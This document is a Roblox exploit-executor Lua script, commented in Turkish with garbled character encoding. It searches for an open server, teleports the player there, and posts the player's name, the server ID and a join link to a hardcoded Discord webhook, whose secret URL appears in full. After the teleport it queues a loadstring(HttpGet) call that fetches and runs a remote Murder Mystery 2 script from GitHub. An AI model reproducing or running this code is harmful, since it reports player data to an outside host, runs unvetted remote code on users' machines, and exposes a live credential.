-- âœ… Tek sefer Ã§alÄ±ÅŸtÄ±rma kontrolÃ¼
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer

-- âœ… Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1407545253342482502/Hf7jtvsT7qFGaD4WIRt-Jg-ObkKUJ3__Vp1xpzZ3sQKUXbaecioGYZopVqii5P1n9iGn"

-- âœ… PlaceId
local PLACE_ID = game.PlaceId

-- âœ… Universal request (executor uyumlu)
local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
if not req then warn("Request function bulunamadi!") return end

-- ðŸ”¹ Debug mesajÄ±
req({
    Url = WEBHOOK_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({content = "ðŸ¤– Bot baÅŸlatÄ±ldÄ±, herkes iÃ§in server aramasÄ± yapÄ±lÄ±yor..."})
})

-- ðŸ”¹ Server tarama fonksiyonu
local function GetAvailableServer(placeId)
    local url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", placeId)
    local response = req({Url = url, Method = "GET"})
    if response and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        if data and data.data then
            for _, server in ipairs(data.data) do
                if server.playing < server.maxPlayers then
                    return server.id -- ilk uygun server
                end
            end
        end
    end
    return nil
end

-- ðŸ”¹ Tarama, webhook + teleport + pastefy script
spawn(function()
    while true do
        local jobId = GetAvailableServer(PLACE_ID)
        if jobId then
            local joinLink = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", PLACE_ID, jobId)
            local robloxCode = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", PLACE_ID, jobId)
            
            -- Webhook payload
            local payload = {
                content = robloxCode,
                embeds = {{
                    title = "ðŸ”— Tap to Join",
                    description = string.format("[Join Server Here](%s)\n**Player:** %s\n**PlaceId:** %s\n**ServerId:** %s", joinLink, plr.Name, PLACE_ID, jobId),
                    color = 5814783
                }}
            }
            
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
            
            -- ðŸš€ Teleport
            TeleportService:TeleportToPlaceInstance(PLACE_ID, jobId, plr)
            
            -- ðŸ”¹ Teleport sonrasÄ± pastefy script
            queue_on_teleport([[
                task.spawn(function()
                    print("âœ… Teleport sonrasÄ± kod inject oldu, pastefy script yÃ¼kleniyor...")
                    loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/TravHub/refs/heads/main/MurderMystery2'))()
                end)
            ]])
            
            break
        else
            print("Bot: Uygun server bulunamadÄ±, 1 saniye sonra tekrar denenecek...")
        end
        wait(1)
    end
end)
